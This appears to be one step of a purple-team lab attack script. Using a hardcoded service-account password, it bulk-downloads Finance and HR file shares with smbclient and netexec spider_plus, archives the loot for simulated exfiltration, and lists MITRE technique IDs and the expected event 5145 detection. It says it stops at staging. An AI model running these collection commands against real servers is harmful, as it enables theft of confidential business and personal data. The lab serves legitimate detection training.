#!/usr/bin/env bash
# Step 5: Collect the fake sensitive data and stage it for "exfiltration".
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$FS_IP"

SVC_USER="svc-backup"
SVC_PASS="${1:-Autumn2024!}"

banner "05 COLLECTION + EXFIL (simulated)"
atk "T1039 Data from Network Shared Drive | T1560 Archive Collected Data | T1074 Staging"

STAGE="$LOOT/exfil"; mkdir -p "$STAGE"
echo "[*] Grabbing the over-exposed Finance data and the HR share..."
smbclient "//$FS_IP/Finance" -U "$DOMAIN/$SVC_USER%$SVC_PASS" -c "prompt OFF; recurse ON; mget *" -D "" 2>/dev/null \
    && mv -f ./*.csv "$STAGE/" 2>/dev/null || true
nxc smb "$FS_IP" -u "$SVC_USER" -p "$SVC_PASS" -M spider_plus -o DOWNLOAD_FLAG=True 2>/dev/null || true

echo "[*] Archiving the loot (what a real actor would compress before exfil)..."
tar -czf "$LOOT/acme-exfil-$(date +%Y%m%d).tar.gz" -C "$STAGE" . 2>/dev/null || true

echo "[+] Staged archive in $LOOT. In this lab we stop at staging - no real egress."
expect "5145 detailed file-share reads of Finance/HR CSVs; a burst of reads in a short window."
